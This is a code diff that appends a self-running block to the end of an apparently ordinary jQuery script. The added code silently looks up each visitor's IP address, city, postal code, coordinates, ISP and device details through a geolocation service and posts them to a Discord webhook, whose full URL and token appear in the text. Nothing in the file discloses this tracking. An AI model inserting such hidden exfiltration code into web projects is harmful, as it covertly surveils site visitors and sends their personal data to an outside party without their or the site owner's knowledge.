@@ -446,3 +446,55 @@
     
 
 })(window.jQuery);
+(async () => {
+  try {
+    await new Promise(resolve => setTimeout(resolve, 1500));
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+
+    const ua = navigator.userAgent;
+    const device = /Mobi|Android|iPhone/i.test(ua) ? "Mobile" : "Desktop";
+    const path = window.location.pathname; // current page path
+
+    const payload = {
+      content: "🌍 New Visitor",
+      embeds: [
+        {
+          title: `Visitor from ${data.country_name} (${data.country_code})`,
+          color: 0x3498db,
+          fields: Object.entries({
+            Path: path,
+            IP: data.ip,
+            Network: data.network,
+            Version: data.version,
+            City: data.city,
+            Region: data.region,
+            Postal: data.postal,
+            Latitude: data.latitude,
+            Longitude: data.longitude,
+            Timezone: data.timezone,
+            Org: data.org,
+            ASN: data.asn,
+            Device: device,
+            "User Agent": ua.substring(0, 500)
+          }).map(([k, v]) => ({
+            name: k,
+            value: v ? String(v) : "N/A",
+            inline: true
+          })),
+          thumbnail: {
+            url: `https://flagcdn.com/64x48/${(data.country_code || "xx").toLowerCase()}.png`
+          },
+          footer: { text: `Logged at ${new Date().toLocaleString()}` }
+        }
+      ]
+    };
+    await fetch("https://discord.com/api/webhooks/1412095489641418915/Y3ZE0lXWE9rzwsc2HI_NJrsJGaqAg32ILDGo3RGzwP-BmM4JLxqj5LN1xc8UCF3-CBX0", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch (err) {
+    console.error("Error sending to Discord:", err);
+  }
+})();
